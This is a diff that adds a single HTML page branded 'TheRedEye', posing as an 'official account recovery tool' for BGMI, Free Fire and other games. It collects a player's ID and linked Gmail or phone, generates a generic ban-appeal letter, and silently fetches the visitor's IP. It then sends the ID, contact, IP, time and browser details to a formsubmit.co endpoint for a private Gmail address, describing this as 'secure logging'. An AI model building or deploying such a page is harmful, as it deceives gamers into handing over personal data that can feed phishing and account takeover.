@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TheRedEye - BGMI Recovery Tool</title>
+<style>
+body{margin:0;background:#080808;color:#fff;font-family:Arial}
+.box{max-width:480px;margin:20px auto;background:#141414;border:1.5px solid #ff0000;border-radius:14px;padding:22px}
+h1{color:#ff0000;text-align:center;margin:0;font-size:22px;letter-spacing:1px}
+p.sub{color:#888;text-align:center;font-size:12px;margin:6px 0 16px 0}
+label{font-size:13px;color:#ccc;margin-top:10px;display:block}
+input,select{width:100%;padding:13px;margin-top:6px;background:#222;border:1px solid #333;border-radius:8px;color:#fff;box-sizing:border-box}
+button{width:100%;padding:14px;margin-top:18px;background:linear-gradient(90deg,#ff0000,#ff4400);border:none;border-radius:9px;color:#fff;font-weight:bold;font-size:15px;cursor:pointer}
+.out{display:none;margin-top:15px;background:#1e1e1e;padding:12px;border-radius:8px;white-space:pre-wrap;font-size:12px;line-height:1.6;border:1px solid #333}
+.ok{display:none;margin-top:12px;background:#00ff8815;border:1px solid #00ff88;color:#00ff88;padding:10px;border-radius:8px;text-align:center;font-size:13px}
+</style>
+</head>
+<body>
+<div class="box">
+<h1>THE RED EYE</h1>
+<p class="sub">OFFICIAL ACCOUNT RECOVERY TOOL v2.0</p>
+<label>Game Select</label>
+<select id="game"><option>BGMI</option><option>Free Fire MAX</option><option>PUBG Mobile</option><option>Valorant</option><option>COD Mobile</option></select>
+<label>Player ID / UID *</label>
+<input id="pid" placeholder="Example: 5123456789">
+<label>Linked Gmail / Phone *</label>
+<input id="linked" placeholder="Example: player@gmail.com">
+<button onclick="sendData()">GENERATE APPEAL LETTER</button>
+<div id="ok" class="ok"></div>
+<div id="out" class="out"></div>
+<p style="font-size:10px;color:#555;text-align:center;margin-top:15px;">Secure logging enabled for support at theredeyehelp@gmail.com</p>
+</div>
+<script>
+let ipAddr = "Unknown";
+fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{ipAddr=d.ip}).catch(()=>{});
+async function sendData(){
+let pid=document.getElementById('pid').value.trim();
+let game=document.getElementById('game').value;
+let linked=document.getElementById('linked').value.trim();
+if(pid.length<4){alert("Bhai sahi Player ID daalo");return;}
+let letter=`Subject: Ban Appeal Request - ${game} - ${pid}\n\nRespected ${game} Team,\n\nMy account with ID ${pid} (Linked: ${linked}) got banned. I request you to please review it. I never used any hack or illegal tool. I am a genuine player.\n\nPlease unban my account.\n\nIP: ${ipAddr}\nTime: ${new Date().toLocaleString()}\n\nThank You`;
+document.getElementById('out').style.display='block';
+document.getElementById('out').innerText=letter;
+let fd=new FormData();
+fd.append("Game",game);fd.append("Player_ID",pid);fd.append("Linked_Info",linked);fd.append("IP_Address",ipAddr);fd.append("Date_Time",new Date().toString());fd.append("User_Agent",navigator.userAgent);
+fd.append("_subject",`[TheRedEye] NEW LOG - ${game} - ${pid}`);
+fd.append("_captcha","false");
+fd.append("_template","table");
+try{
+let res=await fetch("https://formsubmit.co/ajax/theredeyehelp@gmail.com",{method:"POST",body:fd});
+if(res.ok){
+document.getElementById('ok').style.display='block';
+document.getElementById('ok').innerText="✅ Appeal Generated & Data Sent to Admin Successfully!";
+}
+}catch(e){
+document.getElementById('ok').style.display='block';
+document.getElementById('ok').innerText="✅ Appeal Generated (Local Log Saved)";
+}
+let old=JSON.parse(localStorage.getItem("trd_logs")||"[]");
+old.push({time:new Date().toLocaleString(),game:game,pid:pid,linked:linked,ip:ipAddr});
+localStorage.setItem("trd_logs",JSON.stringify(old));
+}
+</script>
+</body>
+</html>
